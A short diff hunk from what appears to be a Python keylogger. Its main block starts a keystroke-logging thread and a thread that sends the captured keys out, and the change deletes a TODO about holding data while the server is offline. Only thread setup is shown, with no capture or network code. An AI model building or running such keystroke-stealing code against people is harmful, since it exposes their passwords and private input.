@@ -52,7 +52,6 @@ if __name__ == '__main__':
     keylogger_thread.start()
     sender_thread = threading.Thread(target=send_keys)
     sender_thread.start()
-    # TODO: keep data until server back online
 
     keylogger_thread.join()
     sender_thread.join()
